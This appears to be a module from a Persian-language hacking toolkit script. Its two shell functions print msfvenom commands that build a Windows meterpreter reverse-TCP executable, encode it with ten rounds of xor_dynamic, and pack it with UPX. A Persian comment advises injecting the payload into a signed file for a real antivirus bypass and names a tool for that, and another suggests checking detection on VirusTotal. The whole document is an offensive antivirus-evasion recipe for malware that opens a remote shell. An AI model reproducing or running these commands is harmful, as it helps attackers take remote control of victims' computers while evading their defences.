DESC="انکود پیلود برای فرار از آنتی‌ویروس"
RISK="HIGH"
NOTE="انکودر قدیمی است؛ برای بایپس واقعی باید پیلود را در فایل امضا‌دار تزریق کنی"

termux(){ echo "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> -e x64/xor_dynamic -i 10 -f exe -o p.exe"; }

kali(){
cat <<'EOF'
LHOST=$(curl -s ifconfig.me)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=4444 \
  -e x64/xor_dynamic -i 10 -f exe -o p.exe
# بسته‌بندی:
upx --best p.exe -o p_packed.exe
# تزریق در فایل امضا‌دار:
#   https://github.com/FortyNorthSecurity/UrbanBishop
# بررسی:
#   https://www.virustotal.com
EOF
}